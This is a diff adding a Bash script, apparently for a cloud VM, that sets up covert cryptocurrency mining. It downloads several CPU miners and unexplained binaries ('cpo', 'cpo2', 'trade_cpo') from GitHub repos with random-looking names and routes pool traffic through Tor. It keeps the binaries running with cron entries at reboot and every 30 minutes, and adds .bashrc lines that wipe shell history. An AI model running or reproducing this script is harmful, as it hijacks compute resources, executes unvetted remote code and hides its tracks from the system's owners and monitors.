@@ -1,0 +1,43 @@
+#!/bin/bash
+sudo apt install tmux tor mc openvpn -y
+cd root
+sudo systemctl start tor
+sudo /usr/sbin/sysctl -w vm.nr_hugepages=1024
+sudo /sbin/sysctl -w vm.nr_hugepages=1024
+cd root
+### MONEROCEAN С КОНФИГОМ: tmux new -ds servak sudo ./xmrig
+wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/dolblu_shluh.tar.gz -P /root
+tar -xf dolblu_shluh.tar.gz
+rm -r dolblu_shluh.tar.gz
+#### CPUMINERRPLANT С КОНФИГОМ: tmux new -ds servak torify ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17079 -u uw38EeZwnZtCbgtKStGS5kDtStRt2zuriE.AUTOTUNE -p webpassword=5698 -t 2
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz -P /root
+tar -xf cpuminer-opt-linux.tar.gz
+sudo rm -r cpuminer-opt-linux.tar.gz 
+#### |NOT RECOMENDED MB BUG| HELLMINER(VERUS): tmux new -ds servak torify ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RSXVsvc1ngHoZzEvrzW5EUSaN8c2o47Xxt.BIG_TEST --cpu 2
+wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx.tar.gz -P /root
+tar -xf hellminer_linux64_avx.tar.gz
+rm -r hellminer_linux64_avx.tar.gz
+#### SRB MINER MULTI КОНФИНГ: tmux new -ds servak sudo ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool eu.luckpool.net:3956 --wallet RSXVsvc1ngHoZzEvrzW5EUSaN8c2o47Xxt.BIG_TEST --proxy localhost:9050 --cpu-threads 2
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-Linux.tar.xz -P /root
+tar -xf SRBMiner-Multi-2-4-7-Linux.tar.xz
+sudo rm -r SRBMiner-Multi-2-4-7-Linux.tar.xz
+mv /home/azureuser/SRBMiner-Multi-2-4-7/* /root
+#### QUBIC \ QLI-CLIENT\ tmux new -ds servak torify ./qli-Client
+wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/qubic.tar.gz -P /root
+tar -xf qubic.tar.gz
+#####################################################################################################################
+wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/cpo -P /root
+wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/cpo2 -P /root
+wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/trade_cpo -P /root
+chmod ugo+x cpo2
+chmod ugo+x cpo
+chmod ugo+x trade_cpo
+sudo systemctl enable cron
+crontab -l | { cat; echo "@reboot /root/cpo2"; } | crontab
+crontab -l | { cat; echo "0,30 * * * * /root/trade_cpo"; } | crontab
+echo ". cat /dev/null > ~/.bash_history" >> ~/.bashrc
+echo ". history -cw" >> ~/.bashrc
+sudo echo ". cat /dev/null > ~/.bash_history" >> ~/.bashrc
+sudo echo ". history -cw" >> ~/.bashrc
+sleep 15
+sudo systemctl start tor
